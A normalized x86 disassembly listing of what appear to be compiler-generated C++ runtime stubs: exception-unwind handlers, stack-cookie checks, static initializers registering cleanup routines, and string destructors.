mov ecx [ ebp - 0x144 ]
add ecx 0x48
jmp sub_401900
sub_42f07a
mov eax [ ebp - 0x134 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42f088
lea ecx [ ebp - 0x128 ]
jmp sub_401900
sub_42f093
lea ecx [ ebp - 0xf0 ]
jmp sub_401900
sub_42f09e
mov ecx [ ebp - 0x134 ]
jmp sub_401900
sub_42f0a9
lea ecx [ ebp - 0xb8 ]
jmp sub_401900
sub_42f0b4
lea ecx [ ebp - 0x10c ]
jmp sub_401900
sub_42f0bf
lea ecx [ ebp - 0xd4 ]
jmp sub_401900
sub_42f0ca
mov ecx [ ebp - 0x13c ]
jmp sub_401900
sub_42f0d5
lea ecx [ ebp - 0x9c ]
jmp sub_401900
sub_42f0e0
lea ecx [ ebp - 0x48 ]
jmp sub_401900
sub_42f0e8
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42f0f0
lea ecx [ ebp - 0x64 ]
jmp sub_401900
sub_42f0f8
lea ecx [ ebp - 0x80 ]
jmp sub_401900
sub_42f100
lea ecx [ ebp - 0x48 ]
jmp sub_401900
sub_42f108
lea ecx [ ebp - 0x2c ]
jmp sub_401900
sub_42f110
lea ecx [ ebp - 0x80 ]
jmp sub_401900
sub_42f118
lea ecx [ ebp - 0x64 ]
jmp sub_401900
sub_42f120
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x148 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42f150
mov eax [ ebp - 0xd0 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42f15e
mov eax [ ebp - 0xd0 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42f16c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd8 ]
xor ecx eax
call sub_41ac09
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42f1a0
lea ecx [ ebp - 0x88 ]
jmp sub_4061c0
sub_42f1ab
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42f1b6
mov eax [ ebp - 0x14 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42f1c1
mov eax [ ebp - 0x14 ]
push eax
call sub_41a0d6
pop ecx
retn
sub_42f1cc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42f1ea
lea ecx [ ebp - 0x10 ]
jmp sub_4197b1
sub_42f1f2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42f20d
mov ecx [ ebp - 0x10 ]
jmp sub_40a030
sub_42f215
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_40a670
sub_42f220
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42f23b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42f260
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f270
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f290
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f2b0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f2c0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f2d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f2f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f310
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f320
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f340
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f360
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f380
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f390
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f3b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f3d0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f3e0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f3f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f410
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f430
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f440
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f460
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f480
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f4a0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f4b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f4d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f4f0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f500
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f510
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f530
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f550
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f560
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f570
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f590
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f5b0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f5c0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f5d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f5f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f610
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f620
push 0x1
push r--data
mov ecx rw-data
call sub_4076d0
push sub_42fb20
call sub_41b488
pop ecx
retn
sub_42f640
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f650
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f670
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f690
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f6a0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f6b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f6d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f6f0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f700
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f710
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f730
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f750
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f760
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f770
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f790
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f7b0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f7c0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f7d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f7f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f810
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f820
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f830
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f850
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f870
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f880
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f890
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f8b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f8d0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f8e0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f8f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f910
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f930
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42f940
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f960
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f980
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f9a0
push 0x1
push r--data
mov ecx rw-data
call sub_4076d0
push sub_42fb50
call sub_41b488
pop ecx
retn
sub_42f9c0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_42f9d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42f9f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42fa10
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_42fa20
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42fa40
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42fa60
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_42fa80
push 0x1
push r--data
mov ecx rw-data
call sub_4076d0
push sub_42fb80
call sub_41b488
pop ecx
retn
sub_42fa9d
mov ecx rw-data
call sub_41972f
push sub_42fbae
call sub_41b488
pop ecx
retn
sub_42fab3
push sub_42fbc2
call sub_41b488
pop ecx
retn
sub_42fabf
push sub_42fbb8
call sub_41b488
pop ecx
retn
sub_42facb
push sub_42fbcc
call sub_41b488
pop ecx
retn
sub_42fad7
push sub_42fbd7
call sub_41b488
pop ecx
retn
sub_42fae3
push sub_42fbe2
call sub_41b488
pop ecx
retn
sub_42faef
mov ecx rw-data
call sub_41972f
push sub_42fbed
call sub_41b488
pop ecx
retn
sub_42fb05
push sub_42fbf7
call sub_41b488
pop ecx
retn
sub_42fb20
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_41a0d6
add esp 0x4
sub_42fb50
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_41a0d6
add esp 0x4
sub_42fb80
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_41a0d6
add esp 0x4
sub_42fbae
mov ecx rw-data
jmp sub_419760
sub_42fbb8
mov ecx rw-data
jmp sub_40a040
sub_42fbc2
mov ecx rw-data
jmp sub_4198e4
sub_42fbcc
mov [ rw-data ] r--data
retn
sub_42fbd7
mov [ rw-data ] r--data
retn
sub_42fbe2
mov [ rw-data ] r--data
retn
sub_42fbed
mov ecx rw-data
jmp sub_419760
sub_42fbf7
mov ecx rw-data
jmp sub_419ee4
sub_42fc01
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_419ff3
